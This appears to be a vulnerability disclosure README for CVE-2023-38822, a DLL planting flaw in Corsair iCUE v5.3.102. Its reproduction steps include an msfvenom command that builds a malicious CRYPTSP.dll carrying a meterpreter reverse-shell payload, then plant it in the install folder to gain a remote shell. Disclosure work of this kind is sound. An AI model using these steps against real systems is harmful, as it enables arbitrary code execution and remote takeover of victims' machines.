# Corsair---DLL-Planting-CVE-2023-38822
DLL Planting in the Corsair iCUE v.5.3.102 CVE-2023-38822
Discoverer: Idan Malihi

# Description
An issue in Corsair iCUE v.5.3.102 allows a local attacker to execute
arbitrary code via the MPDC.dll, CRYPTSP.dll, dcomp.dll, profapi.dll, and MSASN1.dll components.

# Steps to Reproduce
To exploit the DLL Planting vulnerability, an attacker should take the following steps:
1. Download iCUE's latest version.
2. Install the iCUE product.
3. Open the installation path folder, for example, C:\Program Files\Corsair\Corsair iCUE5 Software\
4. Create a malicious dll file with msfvenom on Kali Linux OS:
msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o CRYPTSP.dll
5. Transfer the DLL file to the game's path C:\Program Files\Corsair\Corsair iCUE5 Software\
6. Run the iCUE.exe and get a reverse shell.
